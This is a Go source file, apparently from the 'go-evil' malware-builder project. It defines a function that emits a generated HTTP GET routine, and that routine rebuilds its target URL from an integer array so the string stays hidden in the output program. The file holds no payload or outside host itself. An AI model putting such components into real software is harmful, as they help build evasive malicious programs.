package http

import (
	"fmt"

	"github.com/DennisTheodoreNedry/go-evil/utility/structure/functions"
	"github.com/DennisTheodoreNedry/go-evil/utility/structure/json"
)

// Peforms a GET Request to the provided url
// The result is saved in a runtime variable
func Get(value string, data_object *json.Json_t) []string {
	function_call := "get"

	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
		Parameters: []string{"repr_1 []int"},
		Gut: []string{
			"url := spine.variable.get(spine.alpha.construct_string(repr_1))",
			"resp, err := http.Get(url)",
			"if err != nil {",
			"spine.log(err.Error())",
			"}",

			"defer resp.Body.Close()",
			"body, err := io.ReadAll(resp.Body)",

			"if err != nil {",
			"spine.log(err.Error())",
			"}",

			"spine.variable.set(string(body))",
		}})

	data_object.Add_go_import("net/http")
	data_object.Add_go_import("io")

	parameter_1 := data_object.Generate_int_array_parameter(value)

	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}
}
